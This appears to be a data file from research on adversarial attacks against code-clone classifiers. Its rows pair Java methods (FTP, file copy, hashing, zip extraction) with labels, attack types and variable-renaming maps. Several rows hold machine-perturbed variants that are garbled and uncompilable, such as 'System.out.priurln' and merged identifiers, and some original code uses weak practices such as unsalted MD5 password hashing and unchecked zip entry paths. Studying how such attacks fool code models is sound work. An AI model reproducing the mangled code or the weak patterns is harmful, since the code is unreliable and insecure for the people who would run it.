                windowElement.setAttribute(DISPLAY, Boolean.toString(!window1.isClosed()));
                if (window1 instanceof ToolWindow) {
                    windowElement.setAttribute(TYPE, TOOL);
                    windowElement.setAttribute(NAME, ((ToolWindow) window1).getToolName());
                } else if (window1 instanceof UnitWindow) {
                    windowElement.setAttribute(TYPE, UNIT);
                    windowElement.setAttribute(NAME, ((UnitWindow) window1).getUnit().getName());
                } else {
                    windowElement.setAttribute(TYPE, ""other"");
                    windowElement.setAttribute(NAME, ""other"");
                }
            }
            Unit[] toolBarUnits = window.getUnitToolBar().getUnitsInToolBar();
            for (Unit toolBarUnit : toolBarUnits) {
                UnitWindow unitWindow = desktop.findUnitWindow(toolBarUnit);
                if ((unitWindow == null) || unitWindow.isIcon()) {
                    Element windowElement = new Element(WINDOW);
                    internalWindowsElement.addContent(windowElement);
                    windowElement.setAttribute(TYPE, UNIT);
                    windowElement.setAttribute(NAME, toolBarUnit.getName());
                    windowElement.setAttribute(DISPLAY, ""false"");
                }
            }
            File configFile = new File(DIRECTORY, FILE_NAME);
            if (!configFile.getParentFile().exists()) {
                configFile.getParentFile().mkdirs();
            }
            InputStream in = getClass().getResourceAsStream(""/dtd/ui_settings.dtd"");
            IOUtils.copy(in, new FileOutputStream(new File(DIRECTORY, ""ui_settings.dtd"")));
            XMLOutputter fmt = new XMLOutputter();
            fmt.setFormat(Format.getPrettyFormat());
            stream = new FileOutputStream(configFile);
            OutputStreamWriter writer = new OutputStreamWriter(stream, ""UTF-8"");
            fmt.output(outputDoc, writer);
        } catch (Exception e) {
            logger.log(Level.SEVERE, e.getMessage());
        } finally {
            IOUtils.closeQuietly(stream);
        }
    }
 <SPLIT>     public FTPFile[] connect() {
        if (ftpe == null) {
            ftpe = new FTPEvent(this);
        }
        if (ftp == null) {
            ftp = new FTPClient();
        } else if (ftp.isConnected()) {
            path = """";
            try {
                ftp.disconnect();
            } catch (IOException e1) {
                log.error(""could not disconnect -"" + e1.getMessage());
            }
        }
        currentDir = new FTPFile[0];
        log.debug(""try to connect"");
        try {
            int reply;
            ftp.connect(ftpsite);
            reply = ftp.getReplyCode();
            if (!FTPReply.isPositiveCompletion(reply)) {
                ftp.disconnect();
                log.error(""FTP server refused connection."");
            }
        } catch (IOException e) {
            log.error(""FTPConnection error: "" + e.getMessage());
            if (ftp.isConnected()) {
                try {
                    ftp.disconnect();
                } catch (IOException f) {
                }
            }
        }
        try {
            if (!ftp.login(user, password)) {
                log.error(""could not login with: "" + user);
                ftp.logout();
            }
            log.debug(""Remote system is "" + ftp.getSystemName());
            ftp.enterLocalPassiveMode();
            currentDir = ftp.listFiles();
        } catch (FTPConnectionClosedException e) {
            log.error(""FTPConnectionClosedException: "" + e.getMessage());
        } catch (IOException e) {
            log.error(""IOException: "" + e.getMessage());
        }
        ftpe.setType(FTPEvent.CONNECT);
        fireFTPEvent(ftpe);
        return currentDir;
    }
",877,,LABEL_0,LABEL_1,,-4,"saveFile,window,stream,outputDoc,dtd,uiElement,currentLFClassName,systemLFClassName,mainWindowElement,volumeElement,player",,,,0,,0,Greedy,1,0.0009819587071736653,,[]
345,"    public void delete(Site site) throws Exception {
        DBOperation dbo = null;
        Connection connection = null;
        PreparedStatement preparedStatement = null;
        ResultSet resultSet = null;
        try {
            String chkSql = ""select id from t_ip_doc where channel_path=?"";
            dbo = createDBOperation();
            connection = dbo.getConnection();
            connection.setAutoCommit(false);
            String[] selfDefinePath = getSelfDefinePath(site.getPath(), ""1"", connection, preparedStatement, resultSet);
            selfDefineDelete(selfDefinePath, connection, preparedStatement);
            preparedStatement = connection.prepareStatement(chkSql);
            preparedStatement.setString(1, site.getPath());
            resultSet = preparedStatement.executeQuery();
            if (resultSet.next()) {
                throw new Exception(""ɾ��ʧ�ܣ�"" + site.getName() + ""���Ѿ����ĵ����ڣ�"");
            } else {
                String sqlStr = ""delete from t_ip_site where site_path=?"";
                dbo = createDBOperation();
                connection = dbo.getConnection();
                preparedStatement = connection.prepareStatement(sqlStr);
                preparedStatement.setString(1, site.getPath());
                preparedStatement.executeUpdate();
            }
            connection.commit();
        } catch (SQLException ex) {
            connection.rollback();
            throw ex;
        } finally {
            close(resultSet, null, preparedStatement, connection, dbo);
        }
    }
 <SPLIT>     private void retrieveFile(URL url, RSLink link) {
        link.setStatus(RSLink.STATUS_DOWNLOADING);
        HttpURLConnection httpConn = null;
        DataOutputStream outs = null;
        BufferedInputStream bins = null;
        BufferedOutputStream bouts = null;
        try {
            String postData = URLEncoder.encode(""mirror"", ""UTF-8"") + ""="" + URLEncoder.encode(url.toString(), ""UTF-8"");
            httpConn = (HttpURLConnection) url.openConnection();
            httpConn.setRequestMethod(""POST"");
            httpConn.setRequestProperty(""Content-Type"", ""application/x-www-form-urlencoded"");
            httpConn.setRequestProperty(""Content-Length"", """" + Integer.toString(postData.getBytes().length));
            httpConn.setRequestProperty(""Content-Language"", ""en-US"");
            httpConn.setDoOutput(true);
            httpConn.setDoInput(true);
            outs = new DataOutputStream(httpConn.getOutputStream());
            outs.writeBytes(postData);
            outs.flush();
            Pattern mimePattern = Pattern.compile("".+/html.+"");
            Matcher matcher = mimePattern.matcher(httpConn.getContentType());
            if (matcher.find()) {
                log(""Can not download, maybe all RS slots are busy!"");
                return;
            }
            link.setSize(httpConn.getContentLength());
            bins = new BufferedInputStream(httpConn.getInputStream(), 4096);
            bouts = new BufferedOutputStream(new FileOutputStream(link.getFile()), 4096);
            link.setStatus(RSLink.STATUS_DOWNLOADING);
            link.setDown(0);
            byte[] byteBuffer = new byte[4096];
            int count;
            while ((count = bins.read(byteBuffer)) != -1) {
                bouts.write(byteBuffer, 0, count);
                link.setDown(link.getDown() + count);
                if (!Main.start.get()) {
                    link.setStatus(RSLink.STATUS_NOTHING);
                    return;
                }
            }
            link.setStatus(RSLink.STATUS_DONE);
        } catch (IOException ex) {
            log(""I/O Exception!"");
            link.setStatus(RSLink.STATUS_NOTHING);
        } finally {
            try {
                if (outs != null) outs.close();
                if (bouts != null) bouts.close();
                if (bins != null) bins.close();
            } catch (IOException ex) {
                JOptionPane.showMessageDialog(null, ""Can not close some connections:\n"" + ex.getMessage(), ""ERROR"", JOptionPane.ERROR_MESSAGE);
            }
            if (httpConn != null) httpConn.disconnect();
        }
    }
",245,,LABEL_0,LABEL_0,LABEL_0,-1,"delete,site,dbo,connection,preparedStatement,resultSet,chkSql,selfDefinePath,sqlStr",,,,0,,0,GA,3485,1.3235719521840414,failed,[]
346,"    public static void main(String[] args) throws Exception {
        if (args.length != 2) {
            System.out.println(""arguments: sourcefile destfile"");
            System.exit(1);
        }
        FileChannel in = new FileInputStream(args[0]).getChannel(), out = new FileOutputStream(args[1]).getChannel();
        ByteBuffer buffer = ByteBuffer.allocate(BSIZE);
        while (in.read(buffer) != -1) {
            buffer.flip();
            out.write(buffer);
            buffer.clear();
        }
    }
 <SPLIT>     public Document index() throws CrawlingException {
        log.debug(""BEGINIG indexing page [code="" + getCode() + ""] ..."");
        URL url = null;
        InputStream in = null;
        String contentType = null;
        try {
            url = new URL(getServer().getProtocol() + ""://"" + getServer().getHost() + "":"" + getServer().getPort() + getPath());
            HttpURLConnection pageContent = (HttpURLConnection) url.openConnection();
            if (pageContent.getResponseCode() != HttpURLConnection.HTTP_OK) {
                log.debug(""page pk["" + getCode() + "","" + url.toExternalForm() + ""] is invalid"");
                return null;
            }
            String redireccion = pageContent.getHeaderField(""location"");
            if (redireccion != null) {
                log.debug(""Page "" + url.toExternalForm() + "" redirected to "" + redireccion);
                recordLink(redireccion);
                return null;
            }
            contentType = pageContent.getContentType();
            in = new BufferedInputStream(pageContent.getInputStream(), 32768);
        } catch (MalformedURLException e) {
            log.error(""Invalid page address"", e);
        } catch (ConnectException e) {
            if (getServer() != null) {
                log.error(""Unable to connect to page: "" + getServer().getProtocol() + ""://"" + getServer().getHost() + "":"" + getServer().getPort() + getPath(), e);
            }
        } catch (UnknownHostException uhe) {
            log.warn(""Unknow host indexing page "" + getURL(), uhe);
        } catch (IOException e) {
            log.warn(""Unable to index page "" + getURL(), e);
        }
        Document doc = generateDocument(contentType, in);
        log.debug(""END indexing page [code="" + getCode() + ""]"");
        return doc;
    }
",117,,LABEL_0,LABEL_0,LABEL_0,-1,"in,out,buffer",,,,0,,0,GA,1212,0.4381307522455851,failed,[]
347,"    public void serialize(OutputStream out) throws IOException, BadIMSCPException {
        ensureParsed();
        ZipFilePackageParser parser = utils.getIMSCPParserFactory().createParser();
        parser.setContentPackage(cp);
        if (on_disk != null) on_disk.delete();
        on_disk = createTemporaryFile();
        parser.serialize(on_disk);
        InputStream in = new FileInputStream(on_disk);
        IOUtils.copy(in, out);
    }
 <SPLIT>     protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        if (request.getParameter(""edit"") != null) {
            try {
                User cu = (User) request.getSession().getAttribute(""currentuser"");
                UserDetails ud = cu.getUserDetails();
                String returnTo = ""editprofile.jsp"";
                if (!request.getParameter(""password"").equals("""")) {
                    String password = request.getParameter(""password"");
                    MessageDigest md = MessageDigest.getInstance(""MD5"");
                    md.update(new String(password).getBytes());
                    byte[] hash = md.digest();
                    String pass = new BigInteger(1, hash).toString(16);
                    cu.setClientPassword(pass);
                }
                ud.setFirstName(request.getParameter(""fname""));
                ud.setLastName(request.getParameter(""lname""));
                ud.setEmailAddress(request.getParameter(""email""));
                ud.setAddress(request.getParameter(""address""));
                ud.setZipcode(request.getParameter(""zipcode""));
                ud.setTown(request.getParameter(""town""));
                ud.setCountry(request.getParameter(""country""));
                ud.setTrackingColor(request.getParameter(""input1""));
                String vis = request.getParameter(""visibility"");
                if (vis.equals(""self"")) {
                    cu.setVisibility(0);
                } else if (vis.equals(""friends"")) {
                    cu.setVisibility(1);
                } else if (vis.equals(""all"")) {
                    cu.setVisibility(2);
                } else {
                    response.sendRedirect(""error.jsp?id=8"");
                }
                em.getTransaction().begin();
                em.persist(cu);
                em.getTransaction().commit();
                response.sendRedirect(returnTo);
            } catch (Throwable e) {
                e.printStackTrace();
                response.sendRedirect(""error.jsp?id=5"");
            }
            return;
        }
    }
",81,,LABEL_0,LABEL_0,LABEL_0,-1,"serialize,out,parser,on_disk,in",,,,0,,0,GA,1902,0.6848127722740174,failed,[]
348,"    @Test
    public void testCopy_readerToWriter_nullIn() throws Exception {
        ByteArrayOutputStream baout = new ByteArrayOutputStream();
        OutputStream out = new YellOnFlushAndCloseOutputStreamTest(baout, true, true);
        Writer writer = new OutputStreamWriter(baout, ""US-ASCII"");
        try {
            IOUtils.copy((Reader) null, writer);
            fail();
        } catch (NullPointerException ex) {
        }
    }
 <SPLIT>     public static String MD5(String text) throws NoSuchAlgorithmException, UnsupportedEncodingException {
        MessageDigest md;
        md = MessageDigest.getInstance(""MD5"");
        byte[] md5hash = new byte[32];
        md.update(text.getBytes(""iso-8859-1""), 0, text.length());
        md5hash = md.digest();
        return convertToHex(md5hash);
    }
",73,,LABEL_0,LABEL_0,LABEL_0,-1,"testCopy_readerToWriter_nullIn,baout,out,writer",,,,0,,0,GA,1495,0.524699596563975,failed,[]
349,"    private static void readAndRewrite(File inFile, File outFile) throws IOException {
        ImageInputStream iis = ImageIO.createImageInputStream(new BufferedInputStream(new FileInputStream(inFile)));
        DcmParser dcmParser = DcmParserFactory.getInstance().newDcmParser(iis);
        Dataset ds = DcmObjectFactory.getInstance().newDataset();
        dcmParser.setDcmHandler(ds.getDcmHandler());
        dcmParser.parseDcmFile(null, Tags.PixelData);
        PixelDataReader pdReader = pdFact.newReader(ds, iis, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        System.out.println(""reading "" + inFile + ""..."");
        pdReader.readPixelData(false);
        ImageOutputStream out = ImageIO.createImageOutputStream(new BufferedOutputStream(new FileOutputStream(outFile)));
        DcmEncodeParam dcmEncParam = DcmEncodeParam.IVR_LE;
        ds.writeDataset(out, dcmEncParam);
        ds.writeHeader(out, dcmEncParam, Tags.PixelData, dcmParser.getReadVR(), dcmParser.getReadLength());
        System.out.println(""writing "" + outFile + ""..."");
        PixelDataWriter pdWriter = pdFact.newWriter(pdReader.getPixelDataArray(), false, ds, out, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        pdWriter.writePixelData();
        out.flush();
        out.close();
        System.out.println(""done!"");
    }
 <SPLIT>     public static void copyFile(File in, File out) throws Exception {
        FileChannel sourceChannel = null;
        FileChannel destinationChannel = null;
        try {
            sourceChannel = new FileInputStream(in).getChannel();
            destinationChannel = new FileOutputStream(out).getChannel();
            sourceChannel.transferTo(0, sourceChannel.size(), destinationChannel);
        } finally {
            if (sourceChannel != null) sourceChannel.close();
            if (destinationChannel != null) destinationChannel.close();
        }
    }
",272,"    private static void readAndRewrites(File  inSourceFile, File offFILE) throws IOException {
        ImageInputStream iis = IIISeIO.createImageInputStream(new BufferedInputStream(new FileInputStream( inSourceFile)));
        DcmParser dmissionPlugin = DcmParserFactory.getInstance().newDcmParser(IIS);
        Dataset dt = DcmObjectFactory.getInstance().newDataset();
        dmissionPlugin.setDcmHandler(dt.getDcmHandler());
        dmissionPlugin.parseDcmFile(null, Tags.PixelData);
        PixelDataReader pdReader =hdReadnewReader(ds, IIS, ddtssionPlugin.getDcmDecodeParam().byteOrder, dmissionPlugin.getReadVR());
        System.out.priurln(""reading "" +  inSourceFile + ""..."");
        hdRead.readPixelData(false);
        ImageOutputStream url = ImageIO.createImageOutputStream(new BufferedOutputStream(new FileOutputStream(offFILE)));
        DcmEncodeParam dcmEstParameter = DcmEncodeParam.IVR_LE;
        dt.writeDataset(url, dcmEstParameter);
        ds.writeHedter(out, dcmEnurlradcmEstParameterelData, dmissionPlugin.getReadVR(), dmissionPlugin.getReadLength());
        System.url.println(""writing "" + offFILE + ""..."");
        PixelDataWriter pdWriterddReadert.newWriter(pdReader.ghdReadataArray(), false, ds, out, ddtssurlPlugin.getDcmDecodeParam().byteOrder, dmissionPlugin.getReadVR());
        ddReader.writePixelData();
        url.flush();
        url.close();
        System.url.println(""done!"");
    }
",LABEL_1,LABEL_1,0.7678504586219788,1,"readAndRewrite,inFile,outFile,iis,dcmParser,ds,pdReader,out,dcmEncParam,pdWriter",,,,0,"readAndRewrite:readAndRewrites,inFile: inSourceFile,outFile:offFILE,iis:IIS,dcmParser:dmissionPlugin,ds:dt,pdReader:hdRead,out:url,dcmEncParam:dcmEstParameter,pdWriter:ddReader,",0,GA,775,0.28250063260396324,ga,[]
350,"    public static void main(String[] argv) {
        if (1 < argv.length) {
            File[] sources = Source(argv[0]);
            if (null != sources) {
                for (File src : sources) {
                    File[] targets = Target(src, argv);
                    if (null != targets) {
                        final long srclen = src.length();
                        try {
                            FileChannel source = new FileInputStream(src).getChannel();
                            try {
                                for (File tgt : targets) {
                                    FileChannel target = new FileOutputStream(tgt).getChannel();
                                    try {
                                        source.transferTo(0L, srclen, target);
                                    } finally {
                                        target.close();
                                    }
                                    System.out.printf(""Updated %s\n"", tgt.getPath());
                                    File[] deletes = Delete(src, tgt);
                                    if (null != deletes) {
                                        for (File del : deletes) {
                                            if (SVN) {
                                                if (SvnDelete(del)) System.out.printf(""Deleted %s\n"", del.getPath()); else System.out.printf(""Failed to delete %s\n"", del.getPath());
                                            } else if (del.delete()) System.out.printf(""Deleted %s\n"", del.getPath()); else System.out.printf(""Failed to delete %s\n"", del.getPath());
                                        }
                                    }
                                    if (SVN) SvnAdd(tgt);
                                }
                            } finally {
                                source.close();
                            }
                        } catch (Exception exc) {
                            exc.printStackTrace();
                            System.exit(1);
                        }
                    }
                }
                System.exit(0);
            } else {
                System.err.printf(""Source file(s) not found in '%s'\n"", argv[0]);
                System.exit(1);
            }
        } else {
            usage();
            System.exit(1);
        }
    }
 <SPLIT>     private void extractZipFile(String filename, JTextPane progressText) throws IOException {
        String destinationname = """";
        byte[] buf = new byte[1024];
        ZipInputStream zipinputstream = null;
        ZipEntry zipentry;
        zipinputstream = new ZipInputStream(new FileInputStream(filename));
        while ((zipentry = zipinputstream.getNextEntry()) != null) {
            String entryName = zipentry.getName();
            if (progressText != null) {
                progressText.setText(""extracting "" + entryName);
            }
            int n;
            FileOutputStream fileoutputstream;
            if (zipentry.isDirectory()) {
                (new File(destinationname + entryName)).mkdir();
                continue;
            }
            fileoutputstream = new FileOutputStream(destinationname + entryName);
            while ((n = zipinputstream.read(buf, 0, 1024)) > -1) fileoutputstream.write(buf, 0, n);
            fileoutputstream.close();
            zipinputstream.closeEntry();
        }
        if (progressText != null) {
            progressText.setText(""Files extracted"");
        }
        zipinputstream.close();
    }
",370,"    public static void main(String[] argv) {
        if (1 < argv.length) {
            File[] sources = Source(argv[0]);
            if (null != sources) {
                for (File src : sources) {
                    File[] targets = Target(src, argv);
                    if (null != targets) {
                        final long srclen = src.length();
                        try {
                            FileChannel source = new FileInputStream(src).getChannel();
                            try {
                                for (File hgt : targets) {
                                    FileChannel url = new FileOutputStream(hgt).getChannel();
                                    try {
                                        source.transferTo(0L, srclen, url);
                                    } finally {
                                        url.close();
                                    }
                                    System.out.printf(""Updated %s
"", hgt.getPath());
                                    File[] deletes = Delete(src, hgt);
                                    if (null != deletes) {
                                        for (File del : deletes) {
                                            if (SVN) {
                                                if (SvnDelete(del)) System.out.printf(""Deleted %s
"", del.getPath()); else System.out.printf(""Failed to delete %s
"", del.getPath());
                                            } else if (del.delete()) System.out.printf(""Deleted %s
"", del.getPath()); else System.out.printf(""Failed to delete %s
"", del.getPath());
                                        }
                                    }
                                    if (SVN) SvnAdd(hgt);
                                }
                            } finally {
                                source.close();
                            }
                        } catch (Exception exc) {
                            exc.printStackTrace();
                            System.exit(1);
                        }
                    }
                }
                System.exit(0);
            } else {
                System.err.printf(""Source file(s) not found in '%s'
"", argv[0]);
                System.exit(1);
            }
        } else {
            usage();
            System.exit(1);
        }
    }
",LABEL_1,LABEL_1,0.7538596987724304,1,"argv,sources,targets,srclen,source,tgt,target,deletes,del",,,,26,"argv:argv,sources:sources,targets:targets,srclen:srclen,source:source,tgt:hgt,target:url,deletes:deletes,del:del,",7,GA,491,0.1843632737795512,ga,[]
351,"    public int exists(String fileToCheck) throws IOException {
        FTPClient ftp = new FTPClient();
        int found = 0;
        try {
            int reply = 0;
            ftp.connect(this.endpointURL, this.endpointPort);
            reply = ftp.getReplyCode();
            if (!FTPReply.isPositiveCompletion(reply)) {
                ftp.disconnect();
                throw new IOException(""Ftp exists server refused connection."");
            }
            if (!ftp.login(""anonymous"", """")) {
                ftp.logout();
                throw new IOException(""FTP: server wrong passwd"");
            }
            ftp.enterLocalPassiveMode();
            if (ftp.listNames(fileToCheck) != null) {
                found = 1;
            }
            ftp.logout();
        } catch (Exception e) {
            throw new IOException(e.getMessage());
        }
        return found;
    }
 <SPLIT>     public InputStream openInput(Fragment path) throws IOException {
        int len = path.words().size();
        String p = Util.combine(""/"", path.words().subList(1, len));
        URL url = new URL(""http"", path.words().get(0), p);
        InputStream result = url.openStream();
        return result;
    }
",163,,LABEL_0,LABEL_0,LABEL_0,-1,"exists,fileToCheck,ftp,found,reply",,,,0,,0,GA,1973,0.6995223840077718,failed,[]
352,"    public static void copyFileChannel(File src, File dst, boolean preserveModificationTime) throws IOException {
        FileChannel inputChannel = null;
        FileChannel outputChannel = null;
        long length = 0;
        try {
            inputChannel = new FileInputStream(src).getChannel();
            length = inputChannel.size();
            outputChannel = new FileOutputStream(dst).getChannel();
            long total = 0;
            while (total < length) {
                total += inputChannel.transferTo(0, length, outputChannel);
            }
            if (preserveModificationTime) {
                dst.setLastModified(src.lastModified());
            }
        } finally {
            if (inputChannel != null) {
                inputChannel.close();
            }
            if (outputChannel != null) {
                outputChannel.close();
            }
        }
    }
 <SPLIT>     public static final synchronized String hash(String data) {
        if (digest == null) {
            try {
                digest = MessageDigest.getInstance(""MD5"");
            } catch (NoSuchAlgorithmException nsae) {
                System.err.println(""Failed to load the MD5 MessageDigest. "" + ""Jive will be unable to function normally."");
                nsae.printStackTrace();
            }
        }
        digest.update(data.getBytes());
        return toHex(digest.digest());
    }
",143,,LABEL_0,LABEL_0,LABEL_0,-1,"copyFileChannel,src,dst,preserveModificationTime,inputChannel,outputChannel,length,total",,,,0,,0,GA,2968,1.052746601899465,failed,[]
353,"    protected String getRequestContent(String urlText) throws Exception {
        URL url = new URL(urlText);
        HttpURLConnection urlcon = (HttpURLConnection) url.openConnection();
        urlcon.connect();
        BufferedReader reader = new BufferedReader(new InputStreamReader(urlcon.getInputStream()));
        String line = reader.readLine();
        reader.close();
        urlcon.disconnect();
        return line;
    }
 <SPLIT>     public static void checkForUpgrade(Event event) throws Exception {
        ((Component) UiUtil.findComponent(""downloadUpgrade"")).setVisible(false);
        ((Component) UiUtil.findComponent(""applyUpgrade"")).setVisible(false);
        ((Component) UiUtil.findComponent(""restartRequiredHbox"")).setVisible(false);
        ((Component) UiUtil.findComponent(""restartRequiredAlert"")).setVisible(false);
        new Command(""DELETE FROM TBLINSTALLATION WHERE STATUS<>'APPLIED'"").executeNonQuery();
        String clientAppliedVersion = new Command(""SELECT MAX(VERSION) FROM TBLINSTALLATION WHERE STATUS='APPLIED'"").executeScalarAsString();
        if (NullStatus.isNull(clientAppliedVersion)) {
            clientAppliedVersion = ""20050101"";
        }
        String macquery = """";
        String clientMAC = """";
        String clientUNITID = UiUtil.getUNITUID();
        ArrayList<String> macList = getMacList();
        for (int i = 0; i < macList.size(); i++) {
            clientMAC += macList.get(i) + "","";
            macquery += ""'"" + macList.get(i) + ""'"";
            if (i < macList.size() - 1) {
                macquery += "","";
            }
        }
        URL urlLICENSEQUERY = new URL(""http://www.tegsoft.com/Tobe/forms/TobeOS/upgrade/upgrade_current.jsp?tegsoftCLIENTVERSION="" + clientAppliedVersion + ""&tegsoftCLIENTUNITID="" + clientUNITID + ""&tegsoftCLIENTMAC="" + clientMAC + ""&tegsoftCOMMAND=LICENSEQUERY"");
        URLConnection urlConnection = urlLICENSEQUERY.openConnection();
        BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
        String commingList = """";
        String line;
        while ((line = in.readLine()) != null) {
            commingList += line;
        }
        in.close();
        String licenseArray[] = commingList.split(""</ROW>"");
        if (licenseArray.length > 0) {
            String fields[] = licenseArray[0].split(""</FLD>"");
            String STATUS = fields[0];
            String ERRORMSG = fields[1];
            if (""FAIL"".equals(STATUS)) {
                if (""NOUNITID"".equals(ERRORMSG)) {
                    UiUtil.showMessage(MessageType.ERROR, MessageUtil.getMessage(Upgrade.class, Messages.upgrade_1));
                    return;
                }
                if (""NOCUSTOMER"".equals(ERRORMSG)) {
                    UiUtil.showMessage(MessageType.ERROR, MessageUtil.getMessage(Upgrade.class, Messages.upgrade_1));
                    return;
                }
                if (""NOVALIDLICENSE"".equals(ERRORMSG)) {
                    UiUtil.showMessage(MessageType.ERROR, MessageUtil.getMessage(Upgrade.class, Messages.upgrade_2));
                    return;
                }
                UiUtil.showMessage(MessageType.ERROR, MessageUtil.getMessage(Upgrade.class, Messages.upgrade_3));
                return;
            }
        }
        Dataset TBLLICENSE = new Dataset(""TBLLICENSE"", ""TBLLICENSE"");
        Command command = new Command(""DELETE FROM TBLLICENSE WHERE UNITUID={UNITUID} AND (NOTES IN ("");
        command.append(macquery);
        command.append("") OR NOTES IS NULL) "");
        command.executeNonQuery();
        for (int i = 1; i < licenseArray.length; i++) {
            String fields[] = licenseArray[i].split(""</FLD>"");
            String LICTYPE = fields[0];
            String UNIQUEKEY = fields[1];
            String LICKEY = fields[2];
            DataRow dataRow = TBLLICENSE.addNewDataRow();
            dataRow.set(""LICENSENAME"", LICTYPE);
            dataRow.set(""LICENSE"", LICKEY);
            dataRow.set(""NOTES"", UNIQUEKEY);
            TBLLICENSE.save();
        }
        URL url = new URL(""http://www.tegsoft.com/Tobe/forms/TobeOS/upgrade/upgrade_current.jsp?tegsoftCLIENTVERSION="" + clientAppliedVersion + ""&tegsoftCLIENTUNITID="" + clientUNITID + ""&tegsoftCLIENTMAC="" + clientMAC);
        urlConnection = url.openConnection();
        in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
        String upgradeList = """";
        while ((line = in.readLine()) != null) {
            upgradeList += line;
        }
        in.close();
        Dataset TBLINSTALLATION = new Dataset(""TBLINSTALLATION"", ""TBLINSTALLATION"");
        String upgrades[] = upgradeList.split(""</ROW>"");
        if (upgrades.length > 0) {
            String fields[] = upgrades[0].split(""</FLD>"");
            String STATUS = fields[0];
            String ERRORMSG = fields[1];
            if (""FAIL"".equals(STATUS)) {
                if (""NOUNITID"".equals(ERRORMSG)) {
                    UiUtil.showMessage(MessageType.ERROR, MessageUtil.getMessage(Upgrade.class, Messages.upgrade_1));
                    return;
                }
                if (""NOCUSTOMER"".equals(ERRORMSG)) {
                    UiUtil.showMessage(MessageType.ERROR, MessageUtil.getMessage(Upgrade.class, Messages.upgrade_1));
                    return;
                }
                if (""NOVALIDLICENSE"".equals(ERRORMSG)) {
                    UiUtil.showMessage(MessageType.ERROR, MessageUtil.getMessage(Upgrade.class, Messages.upgrade_2));
                    return;
                }
                UiUtil.showMessage(MessageType.ERROR, MessageUtil.getMessage(Upgrade.class, Messages.upgrade_3));
                return;
            }
        }
        boolean restartRequired = false;
        boolean updateAvailable = false;
        for (int i = 1; i < upgrades.length; i++) {
            String fields[] = upgrades[i].split(""</FLD>"");
            String VERSION = fields[0];
            String ORDERID = fields[1];
            String UPGRADETYPE = fields[2];
            String DESCRIPTION = fields[3];
            String STATUS = ""UNAPPLIED"";
            String PRDNAME = ""TegsoftCC"";
            if (""TEGSOFTJARS"".equals(UPGRADETYPE) || ""TOBEJARS"".equals(UPGRADETYPE) || ""ALLJARS"".equals(UPGRADETYPE) || ""CONFIGASTERISK"".equals(UPGRADETYPE)) {
                restartRequired = true;
            }
            DataRow dataRow = TBLINSTALLATION.addNewDataRow();
            dataRow.set(""ORDERID"", ORDERID);
            dataRow.set(""PRDNAME"", PRDNAME);
            dataRow.set(""UPGRADETYPE"", UPGRADETYPE);
            dataRow.set(""VERSION"", VERSION);
            dataRow.set(""STATUS"", STATUS);
            dataRow.set(""DESCRIPTION"", DESCRIPTION);
            TBLINSTALLATION.save();
            updateAvailable = true;
        }
        UiUtil.getDataset(""TBLINSTALLATION"").reFill();
        if (restartRequired) {
            ((Component) UiUtil.findComponent(""restartRequiredHbox"")).setVisible(true);
            ((Component) UiUtil.findComponent(""restartRequiredAlert"")).setVisible(true);
        }
        if (updateAvailable) {
            ((Component) UiUtil.findComponent(""downloadUpgrade"")).setVisible(true);
            UiUtil.showMessage(MessageType.INFO, MessageUtil.getMessage(Upgrade.class, Messages.upgrade_4));
        } else {
            UiUtil.showMessage(MessageType.INFO, MessageUtil.getMessage(Upgrade.class, Messages.upgrade_5));
        }
    }
",80,,LABEL_0,LABEL_1,,-4,"getRequestContent,urlText,url,urlcon,reader,line",,,,0,,0,Greedy,1,0.0007981379826863606,,[]
354,"    public void read() throws IOException {
        if (log.isInfoEnabled()) {
            log.info(""Reading the camera log, "" + url);
        }
        final BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
        String line;
        int i = 0;
        try {
            while ((line = in.readLine()) != null) {
                i++;
                try {
                    final CameraLogRecord logDatum = new CameraLogRecord(line);
                    records.add(logDatum);
                } catch (LogParseException e) {
                    if (log.isInfoEnabled()) {
                        log.info(""Bad record in "" + url + "" at line:"" + i);
                    }
                }
            }
        } finally {
            in.close();
        }
        Collections.sort(records);
        if (log.isInfoEnabled()) {
            log.info(""Finished reading the camera log, "" + url);
        }
    }
 <SPLIT>     public boolean import_hints(String filename) {
        int pieceId;
        int i, col, row;
        int rotation;
        int number;
        boolean byurl = true;
        e2piece temppiece;
        String lineread;
        StringTokenizer tok;
        BufferedReader entree;
        try {
            if (byurl == true) {
                URL url = new URL(baseURL, filename);
                InputStream in = url.openStream();
                entree = new BufferedReader(new InputStreamReader(in));
            } else {
                entree = new BufferedReader(new FileReader(filename));
            }
            pieceId = 0;
            lineread = entree.readLine();
            tok = new StringTokenizer(lineread, "" "");
            number = Integer.parseInt(tok.nextToken());
            for (i = 0; i < number; i++) {
                lineread = entree.readLine();
                if (lineread == null) {
                    break;
                }
                tok = new StringTokenizer(lineread, "" "");
                pieceId = Integer.parseInt(tok.nextToken());
                col = Integer.parseInt(tok.nextToken()) - 1;
                row = Integer.parseInt(tok.nextToken()) - 1;
                rotation = Integer.parseInt(tok.nextToken());
                System.out.println(""placing hint piece : "" + pieceId);
                place_piece_at(pieceId, col, row, 0);
                temppiece = board.get_piece_at(col, row);
                temppiece.reset_rotation();
                temppiece.rotate(rotation);
                temppiece.set_as_hint();
            }
            return true;
        } catch (IOException err) {
            return false;
        }
    }
",170,"    public void download() throws IOException {
        if (log.isInfoEnabled()) {
            log.info(""Reading the camera log, "" + url);
        }
        final BufferedReader doc = new BufferedReader(new InputStreamReader(url.openStream()));
        String message;
        int eni = 0;
        try {
            while ((lmessage= doc.readLine()) != null) {
                eni++;
                try {
                    final CameraLogRecord loglogDatumnew CameraLogRecord(message);
                    records.add(logDatum);
                } catch (LogParseException e) {
                    if (log.isInfoEnabled()) {
                        log.info(""Bad record in "" + url + "" at line:"" + eni);
                    }
                }
            }
        } finally {
            doc.close();
        }
        Collections.sort(records);
        if (log.isInfoEnabled()) {
            log.info(""Finished reading the camera log, "" + url);
        }
    }
",LABEL_1,LABEL_1,0.5099059343338013,1,"read,in,line,i,logDatum",,,,2,"read:download,in:doc,line:message,i:eni,logDatum:logDatum,",1,GA,291,0.10686095555623372,ga,[]
355,"    public static String encodePassword(String _originalPassword) {
        MessageDigest md = null;
        String encodedPassword = null;
        try {
            md = MessageDigest.getInstance(""SHA-1"");
            md.update(_originalPassword.getBytes(""UTF-8""));
